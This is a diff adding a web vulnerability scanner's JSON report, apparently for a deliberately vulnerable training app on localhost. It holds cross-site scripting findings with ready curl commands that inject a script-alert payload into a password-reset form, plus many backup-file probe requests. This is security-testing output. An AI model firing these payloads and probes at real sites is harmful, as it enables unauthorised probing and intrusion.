@@ -1,0 +1,1480 @@
+{
+  "vulnerabilities": {
+    "Cross Site Scripting": [
+      {
+        "info": "XSS vulnerability found via injection in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%3Cscript%3Ealert%28%27wo8s7zybnk%27%29%3C%2Fscript%3E&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%3Cscript%3Ealert%28%27wo8s7zybnk%27%29%3C%2Fscript%3E&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "XSS vulnerability found via injection in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%3Cscript%3Ealert%28%27w33448qg7r%27%29%3C%2Fscript%3E&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%3Cscript%3Ealert%28%27w33448qg7r%27%29%3C%2Fscript%3E&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }
+    ], 
+    "Htaccess Bypass": [], 
+    "Backup file": [
+      {
+        "info": "Backup file http://localhost:3000/signup.backup found for http://localhost:3000/signup", 
+        "http_request": "GET /signup.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup.backup\"", 
+        "path": "/signup.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/signup.bck found for http://localhost:3000/signup", 
+        "http_request": "GET /signup.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup.bck\"", 
+        "path": "/signup.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/signup.old found for http://localhost:3000/signup", 
+        "http_request": "GET /signup.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup.old\"", 
+        "path": "/signup.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/signup.save found for http://localhost:3000/signup", 
+        "http_request": "GET /signup.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup.save\"", 
+        "path": "/signup.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/signup.bak found for http://localhost:3000/signup", 
+        "http_request": "GET /signup.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/signup.bak\"", 
+        "path": "/signup.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/login.backup found for http://localhost:3000/login", 
+        "http_request": "GET /login.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login.backup\"", 
+        "path": "/login.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/login.bck found for http://localhost:3000/login", 
+        "http_request": "GET /login.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login.bck\"", 
+        "path": "/login.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/login.old found for http://localhost:3000/login", 
+        "http_request": "GET /login.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login.old\"", 
+        "path": "/login.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/login.save found for http://localhost:3000/login", 
+        "http_request": "GET /login.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login.save\"", 
+        "path": "/login.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/login.bak found for http://localhost:3000/login", 
+        "http_request": "GET /login.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/login.bak\"", 
+        "path": "/login.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials~ found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials~\"", 
+        "path": "/tutorials/credentials~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials.backup found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials.backup\"", 
+        "path": "/tutorials/credentials.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials.bck found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials.bck\"", 
+        "path": "/tutorials/credentials.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials.old found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials.old\"", 
+        "path": "/tutorials/credentials.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials.save found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials.save\"", 
+        "path": "/tutorials/credentials.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/credentials.bak found for http://localhost:3000/tutorials/credentials", 
+        "http_request": "GET /tutorials/credentials.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/credentials.bak\"", 
+        "path": "/tutorials/credentials.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials.backup found for http://localhost:3000/tutorials", 
+        "http_request": "GET /tutorials.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials.backup\"", 
+        "path": "/tutorials.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials.bck found for http://localhost:3000/tutorials", 
+        "http_request": "GET /tutorials.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials.bck\"", 
+        "path": "/tutorials.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials.old found for http://localhost:3000/tutorials", 
+        "http_request": "GET /tutorials.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials.old\"", 
+        "path": "/tutorials.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials.save found for http://localhost:3000/tutorials", 
+        "http_request": "GET /tutorials.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials.save\"", 
+        "path": "/tutorials.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials.bak found for http://localhost:3000/tutorials", 
+        "http_request": "GET /tutorials.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials.bak\"", 
+        "path": "/tutorials.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection~ found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection~\"", 
+        "path": "/tutorials/injection~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection.backup found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection.backup\"", 
+        "path": "/tutorials/injection.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection.bck found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection.bck\"", 
+        "path": "/tutorials/injection.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection.old found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection.old\"", 
+        "path": "/tutorials/injection.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection.save found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection.save\"", 
+        "path": "/tutorials/injection.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/injection.bak found for http://localhost:3000/tutorials/injection", 
+        "http_request": "GET /tutorials/injection.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/injection.bak\"", 
+        "path": "/tutorials/injection.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth~ found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth~\"", 
+        "path": "/tutorials/broken_auth~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth.backup found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth.backup\"", 
+        "path": "/tutorials/broken_auth.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth.bck found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth.bck\"", 
+        "path": "/tutorials/broken_auth.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth.old found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth.old\"", 
+        "path": "/tutorials/broken_auth.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth.save found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth.save\"", 
+        "path": "/tutorials/broken_auth.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/broken_auth.bak found for http://localhost:3000/tutorials/broken_auth", 
+        "http_request": "GET /tutorials/broken_auth.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/broken_auth.bak\"", 
+        "path": "/tutorials/broken_auth.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss~ found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss~\"", 
+        "path": "/tutorials/xss~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss.backup found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss.backup\"", 
+        "path": "/tutorials/xss.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss.bck found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss.bck\"", 
+        "path": "/tutorials/xss.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss.old found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss.old\"", 
+        "path": "/tutorials/xss.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss.save found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss.save\"", 
+        "path": "/tutorials/xss.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/xss.bak found for http://localhost:3000/tutorials/xss", 
+        "http_request": "GET /tutorials/xss.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/xss.bak\"", 
+        "path": "/tutorials/xss.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor~ found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor~\"", 
+        "path": "/tutorials/insecure_dor~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor.backup found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor.backup\"", 
+        "path": "/tutorials/insecure_dor.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor.bck found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor.bck\"", 
+        "path": "/tutorials/insecure_dor.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor.old found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor.old\"", 
+        "path": "/tutorials/insecure_dor.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor.save found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor.save\"", 
+        "path": "/tutorials/insecure_dor.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_dor.bak found for http://localhost:3000/tutorials/insecure_dor", 
+        "http_request": "GET /tutorials/insecure_dor.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_dor.bak\"", 
+        "path": "/tutorials/insecure_dor.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig~ found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig~\"", 
+        "path": "/tutorials/misconfig~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig.backup found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig.backup\"", 
+        "path": "/tutorials/misconfig.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig.bck found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig.bck\"", 
+        "path": "/tutorials/misconfig.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig.old found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig.old\"", 
+        "path": "/tutorials/misconfig.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig.save found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig.save\"", 
+        "path": "/tutorials/misconfig.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/misconfig.bak found for http://localhost:3000/tutorials/misconfig", 
+        "http_request": "GET /tutorials/misconfig.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/misconfig.bak\"", 
+        "path": "/tutorials/misconfig.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure~ found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure~\"", 
+        "path": "/tutorials/exposure~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure.backup found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure.backup\"", 
+        "path": "/tutorials/exposure.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure.bck found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure.bck\"", 
+        "path": "/tutorials/exposure.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure.old found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure.old\"", 
+        "path": "/tutorials/exposure.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure.save found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure.save\"", 
+        "path": "/tutorials/exposure.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/exposure.bak found for http://localhost:3000/tutorials/exposure", 
+        "http_request": "GET /tutorials/exposure.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/exposure.bak\"", 
+        "path": "/tutorials/exposure.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control~ found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control~\"", 
+        "path": "/tutorials/access_control~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control.backup found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control.backup\"", 
+        "path": "/tutorials/access_control.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control.bck found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control.bck\"", 
+        "path": "/tutorials/access_control.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control.old found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control.old\"", 
+        "path": "/tutorials/access_control.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control.save found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control.save\"", 
+        "path": "/tutorials/access_control.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/access_control.bak found for http://localhost:3000/tutorials/access_control", 
+        "http_request": "GET /tutorials/access_control.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/access_control.bak\"", 
+        "path": "/tutorials/access_control.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf~ found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf~\"", 
+        "path": "/tutorials/csrf~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf.backup found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf.backup\"", 
+        "path": "/tutorials/csrf.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf.bck found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf.bck\"", 
+        "path": "/tutorials/csrf.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf.old found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf.old\"", 
+        "path": "/tutorials/csrf.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf.save found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf.save\"", 
+        "path": "/tutorials/csrf.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/csrf.bak found for http://localhost:3000/tutorials/csrf", 
+        "http_request": "GET /tutorials/csrf.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/csrf.bak\"", 
+        "path": "/tutorials/csrf.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components~ found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components~\"", 
+        "path": "/tutorials/insecure_components~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components.backup found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components.backup\"", 
+        "path": "/tutorials/insecure_components.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components.bck found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components.bck\"", 
+        "path": "/tutorials/insecure_components.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components.old found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components.old\"", 
+        "path": "/tutorials/insecure_components.old", 
